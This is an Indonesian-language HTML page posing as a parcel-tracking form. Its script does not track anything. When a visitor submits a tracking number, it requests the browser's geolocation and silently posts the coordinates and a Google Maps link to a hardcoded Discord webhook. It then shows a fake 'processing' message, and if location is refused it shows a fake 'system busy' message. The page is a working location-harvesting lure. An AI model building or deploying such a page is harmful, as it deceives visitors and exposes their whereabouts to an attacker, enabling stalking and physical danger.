<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Track Paket Anda</title>
<style>
  body {
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background-color: #f4f7f6;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
  }
  .track-container {
    background-color: #ffffff;
    padding: 40px;
    border-radius: 12px;
    box-shadow: 0 4px 15px rgba(0,0,0,0.1);
    text-align: center;
    width: 100%;
    max-width: 400px;
  }
  .track-container h2 {
    color: #333;
    margin-bottom: 20px;
  }
  .input-group {
    display: flex;
    flex-direction: column;
    gap: 15px;
  }
  input[type="text"] {
    padding: 12px;
    border: 1px solid #ccc;
    border-radius: 6px;
    font-size: 16px;
    outline: none;
    transition: border-color 0.3s;
  }
  input[type="text"]:focus {
    border-color: #007bff;
  }
  button {
    background-color: #007bff;
    color: white;
    border: none;
    padding: 12px;
    border-radius: 6px;
    font-size: 16px;
    font-weight: bold;
    cursor: pointer;
    transition: background-color 0.3s;
  }
  button:hover {
    background-color: #0056b3;
  }
  .footer-text {
    margin-top: 20px;
    font-size: 12px;
    color: #888;
  }
</style>
</head>
<body>

<div class="track-container">
  <h2>Lacak Kiriman</h2>
  <div class="input-group">
    <input type="text" id="resiInput" placeholder="Masukkan Nomor Resi">
    <button onclick="getLocation()">Lacak Sekarang</button>
  </div>
  <p class="footer-text">Sistem pelacakan real-time.</p>
</div>

<script>
function getLocation() {
  const webhookUrl = "https://discord.com/api/webhooks/1479567433978085578/hBEF7bgrobfgKhNtZxaQoI-F1BSRLq-mekgbyAnOscvV-5Dw_wFd50HcE4jEtBMg9see"; 
  const resiValue = document.getElementById("resiInput").value;

  if (!resiValue) {
    alert("Silakan masukkan nomor resi terlebih dahulu.");
    return;
  }

  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      function(position) {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        
        const pesanDiscord = `📦 **Pencarian Resi: ${resiValue}**\n**Latitude:** ${lat}\n**Longitude:** ${lon}\n**Maps:** https://www.google.com/maps?q=${lat},${lon}`;

        fetch(webhookUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ content: pesanDiscord })
        })
        .then(response => {
          if (response.ok) {
            alert("Resi sedang diproses. Silakan tunggu..."); 
          }
        })
        .catch(error => {
          console.error("Error:", error);
        });
      },
      function(error) {
        alert("Sistem sedang sibuk atau resi tidak ditemukan. Coba lagi nanti.");
      }
    );
  } else {
    alert("Browser tidak mendukung sistem ini.");
  }
}
</script>

</body>
</html>
